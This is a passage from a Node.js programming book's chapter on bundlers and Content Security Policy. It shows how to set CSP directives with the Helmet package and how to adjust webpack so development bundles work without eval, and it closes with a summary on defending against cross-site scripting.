<p class="normal"><span class="kobospan" id="kobo.803.1">The policy restricts images so they can only come from the same origin as the HTML document. </span><span class="kobospan" id="kobo.803.2">If you examine the browser’s </span><em class="italic"><span class="kobospan" id="kobo.804.1">F12</span></em><span class="kobospan" id="kobo.805.1"> developer tools, you will see an error message in the console similar to this one, which is from Chrome:</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.806.1">...
</span><span class="kobospan" id="kobo.806.2">Refused to load the image 'http://localhost:9999/city.png' because it violates the following Content Security Policy directive: "img-src 'self'".
</span><span class="kobospan" id="kobo.806.3">...
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.807.1">The attempt </span><a id="_idIndexMarker403" class="calibre3"/><span class="kobospan" id="kobo.808.1">to load an image from the bad server was prevented, but if you click the broken image placeholder displayed by the browser, you will still be able to navigate away from the application. </span><span class="kobospan" id="kobo.808.2">Policies generally require multiple directives to be effective.</span></p>
<h2 class="heading1" id="_idParaDest-145"><span class="kobospan" id="kobo.809.1">Using a package to set the policy header</span></h2>
<p class="normal1"><span class="kobospan" id="kobo.810.1">It is possible to set </span><a id="_idIndexMarker404" class="calibre3"/><span class="kobospan" id="kobo.811.1">the CSP header directly, as the previous section demonstrated, but using a package to define a CSP policy is easier and less prone to errors. </span><span class="kobospan" id="kobo.811.2">One excellent package is </span><em class="italic"><span class="kobospan" id="kobo.812.1">Helmet</span></em><span class="kobospan" id="kobo.813.1"> (</span><a href="https://helmetjs.github.io" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.814.1">https://helmetjs.github.io</span></span></a><span class="kobospan" id="kobo.815.1">), which sets several security-related headers, including the CSP header. </span><span class="kobospan" id="kobo.815.2">Run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.816.1">Listing 7.34</span></em><span class="kobospan" id="kobo.817.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.818.1">webapp</span></code><span class="kobospan" id="kobo.819.1"> folder to install the Helmet package. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.820.1">Listing 7.34: Adding a package to the project</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.821.1">npm install helmet@7.1.0
</span></code></pre>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.822.1">Listing 7.35</span></em><span class="kobospan" id="kobo.823.1"> replaces the custom middleware from the previous section with the equivalent functionality provided by Helmet and defines the complete policy for the example application.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.824.1">Listing 7.35: Defining a CSP policy in the server.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="hljs-keyword"><span class="kobospan" id="kobo.825.1">i</span></span><span class="kobospan" id="kobo.826.1">mport { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
import httpProxy from "http-proxy";
</span><strong class="screentext"><span class="kobospan" id="kobo.827.1">import helmet from "helmet";</span></strong><span class="kobospan" id="kobo.828.1">
const port = 5000;
const expressApp: Express = express();
const proxy = httpProxy.createProxyServer({
    target: "http://localhost:5100", ws: true
});
</span><strong class="screentext"><span class="kobospan" id="kobo.829.1">// expressApp.use((req, resp, next) =&gt; {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.830.1">//     resp.setHeader("Content-Security-Policy",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.831.1">//       "img-src 'self'; connect-src 'self'");</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.832.1">//     next();</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.833.1">// })</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.834.1">expressApp.use(helmet({</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.835.1">    contentSecurityPolicy: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.836.1">        directives: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.837.1">            imgSrc: "'self'",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.838.1">            scriptSrcAttr: "'none'",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.839.1">            scriptSrc: "'</span></strong><strong class="screentext"><span class="kobospan" id="kobo.840.1">self'",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.841.1">            connectSrc: "'self' ws://localhost:5000"           </span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.842.1">        }</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.843.1">    }</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.844.1">}));</span></strong><span class="kobospan" id="kobo.845.1">
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
expressApp.use((req, resp) =&gt; proxy.web(req, resp));
const server = createServer(expressApp);
server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.846.1">Helmet is applied as middleware and is configured with an object whose properties determine the headers that are set and the values that should be used. </span><span class="kobospan" id="kobo.846.2">The </span><code class="inlinecode"><span class="kobospan" id="kobo.847.1">contentSecurityPolicy.directives</span></code><span class="kobospan" id="kobo.848.1"> property is used to set CSP directives, expressed as camel case because the hyphenated CSP directive names are not allowed in JavaScript (so </span><code class="inlinecode"><span class="kobospan" id="kobo.849.1">img-src</span></code><span class="kobospan" id="kobo.850.1"> becomes </span><code class="inlinecode"><span class="kobospan" id="kobo.851.1">imgSrc</span></code><span class="kobospan" id="kobo.852.1">, for example).</span></p>
<p class="normal"><span class="kobospan" id="kobo.853.1">The </span><a id="_idIndexMarker405" class="calibre3"/><span class="kobospan" id="kobo.854.1">configuration in </span><em class="italic"><span class="kobospan" id="kobo.855.1">Listing 7.35</span></em><span class="kobospan" id="kobo.856.1"> specifies a content security policy that will allow images to be loaded from the HTML document’s domain, block all JavaScript in element attributes, restrict JavaScript files to the document’s domain, and limit the URLs to which connections can be made by JavaScript code.</span></p>
<p class="normal"><span class="kobospan" id="kobo.857.1">This last directive specifies </span><code class="inlinecode"><span class="kobospan" id="kobo.858.1">self</span></code><span class="kobospan" id="kobo.859.1">, allowing HTTP connections to be sent to the backend server, but also includes the </span><code class="inlinecode"><span class="kobospan" id="kobo.860.1">ws://localhost:5000</span></code><span class="kobospan" id="kobo.861.1"> URL, which allows the connection required by the webpack live reload feature (the </span><code class="inlinecode"><span class="kobospan" id="kobo.862.1">ws</span></code><span class="kobospan" id="kobo.863.1"> scheme denotes a web sockets connection and is the same connection that required additional configuration when setting up the proxy in </span><em class="italic"><span class="kobospan" id="kobo.864.1">Listing 7.21</span></em><span class="kobospan" id="kobo.865.1">). </span></p>
<p class="normal"><span class="kobospan" id="kobo.866.1">If you reload the browser at this point, you will see a CSP error displayed in the browser’s JavaScript console. </span><span class="kobospan" id="kobo.866.2">That’s because the CSP has disabled the use of the </span><code class="inlinecode"><span class="kobospan" id="kobo.867.1">eval</span></code><span class="kobospan" id="kobo.868.1"> function, which is sensible because it is so dangerous, but problematic because webpack unpacks the contents of its bundles using </span><code class="inlinecode"><span class="kobospan" id="kobo.869.1">eval</span></code><span class="kobospan" id="kobo.870.1">. </span><span class="kobospan" id="kobo.870.2">(This is only the case when webpack is producing development bundles and is not the case when the final bundles are produced before an application is deployed.)</span></p>
<p class="normal"><span class="kobospan" id="kobo.871.1">The best approach is to change the webpack configuration so that it uses a different technique to process bundles, as shown in </span><em class="italic"><span class="kobospan" id="kobo.872.1">Listing 7.36</span></em><span class="kobospan" id="kobo.873.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.874.1">Listing 7.36: Changing the webpack configuration in the webpack.config.mjs file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.875.1">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        client: {
            webSocketURL: "http://localhost:5000/ws"
        }
    },
   </span><strong class="screentext"> </strong><strong class="screentext"><span class="kobospan" id="kobo.876.1">devtool: "source-map"</span></strong><span class="kobospan" id="kobo.877.1">
};
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.878.1">Use </span><em class="italic"><span class="kobospan" id="kobo.879.1">Control+C</span></em><span class="kobospan" id="kobo.880.1"> to stop the build tools and run the </span><code class="inlinecode"><span class="kobospan" id="kobo.881.1">npm start</span></code><span class="kobospan" id="kobo.882.1"> command in the </span><code class="inlinecode"><span class="kobospan" id="kobo.883.1">webapp</span></code><span class="kobospan" id="kobo.884.1"> folder to</span><a id="_idIndexMarker406" class="calibre3"/><span class="kobospan" id="kobo.885.1"> start them again with the new configuration. </span><span class="kobospan" id="kobo.885.2">Reload the browser and the JavaScript bundle will be processed without using the </span><code class="inlinecode"><span class="kobospan" id="kobo.886.1">eval</span></code><span class="kobospan" id="kobo.887.1"> function. </span><span class="kobospan" id="kobo.887.2">Run through the examples in </span><em class="italic"><span class="kobospan" id="kobo.888.1">Listing 7.28</span></em><span class="kobospan" id="kobo.889.1"> to </span><em class="italic"><span class="kobospan" id="kobo.890.1">Listing 7.32</span></em><span class="kobospan" id="kobo.891.1"> again and you will see that each attack is defeated by one of the content security settings.</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.892.1">Note</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.893.1">The </span><code class="inlinecode"><span class="kobospan" id="kobo.894.1">Content-Security-Policy-Report-Only</span></code><span class="kobospan" id="kobo.895.1"> header instructs the browser to report on actions that would break the content security policy without blocking those actions, which can be a good way to assess an existing application. </span><span class="kobospan" id="kobo.895.2">If you are using the Helmet package, you can enable this header by setting the </span><code class="inlinecode"><span class="kobospan" id="kobo.896.1">contentSecurityPolicy.reportOnly</span></code><span class="kobospan" id="kobo.897.1"> configuration setting to </span><code class="inlinecode"><span class="kobospan" id="kobo.898.1">true</span></code><span class="kobospan" id="kobo.899.1">. </span></p>
</div>
<p class="normal"><span class="kobospan" id="kobo.900.1">There are limits to CSP and it is important to avoid including unfiltered user input in the HTML displayed to the user. </span><span class="kobospan" id="kobo.900.2">I demonstrate how user input can be processed in Part 2 of this book.</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.901.1">Note</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.902.1">If you are unable to alter the webpack configuration, then you can allow the </span><code class="inlinecode"><span class="kobospan" id="kobo.903.1">eval</span></code><span class="kobospan" id="kobo.904.1"> function in the content security policy. </span><span class="kobospan" id="kobo.904.2">Use </span><code class="inlinecode"><span class="kobospan" id="kobo.905.1">"'self' 'unsafe-eval'"</span></code><span class="kobospan" id="kobo.906.1"> as the value for the </span><code class="inlinecode"><span class="kobospan" id="kobo.907.1">scriptSrc</span></code><span class="kobospan" id="kobo.908.1"> setting. </span><span class="kobospan" id="kobo.908.2">The special </span><code class="inlinecode"><span class="kobospan" id="kobo.909.1">'unsafe-eval'</span></code><span class="kobospan" id="kobo.910.1"> value allows the eval function to be used, but the </span><code class="inlinecode"><span class="kobospan" id="kobo.911.1">'self'</span></code><span class="kobospan" id="kobo.912.1"> value restricts the locations from which JavaScript files can be downloaded to just the backend server.</span></p>
</div>
<h1 class="heading" id="_idParaDest-146"><span class="kobospan" id="kobo.913.1">Summary</span></h1>
<p class="normal1"><span class="kobospan" id="kobo.914.1">In this chapter, I described two important ways in which the backend Node.js server works with the other components in a modern web application. </span><span class="kobospan" id="kobo.914.2">The first topic I described was the use of a bundler:</span></p>
<ul class="calibre4">
<li class="bulletlist"><span class="kobospan" id="kobo.915.1">Bundlers combine and compress multiple files to reduce the number of HTTP requests made by the browser and reduce the amount of data to be transferred.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.916.1">Bundlers are integrated into the developer tools for all of the popular client-side frameworks, including Angular and React.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.917.1">Bundlers can work independently of the backend server, but the best workflows are achieved by using them together.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.918.1">The second topic I described was the application of a content security policy.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.919.1">Content security policies are used to defend against </span><strong class="screentext"><span class="kobospan" id="kobo.920.1">cross-site scripting</span></strong><span class="kobospan" id="kobo.921.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.922.1">XSS</span></strong><span class="kobospan" id="kobo.923.1">) attacks, in which the goal is to trick the browser into executing malicious JavaScript code.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.924.1">To apply a content security policy, the backend server provides the browser with a description of how the client-side application code behaves in terms of how it obtains and uses resources such as images and JavaScript code.</span></li>
<li class="bulletlist1"><span class="kobospan" id="kobo.925.1">The browser blocks JavaScript operations that are outside of the limits imposed by the content security policy.</span></li>
</ul>
<p class="normal"><span class="kobospan" id="kobo.926.1">In the next chapter, I will demonstrate the features that Node.js provides for unit testing and debugging JavaScript code.</span></p>
</div>
</body></html>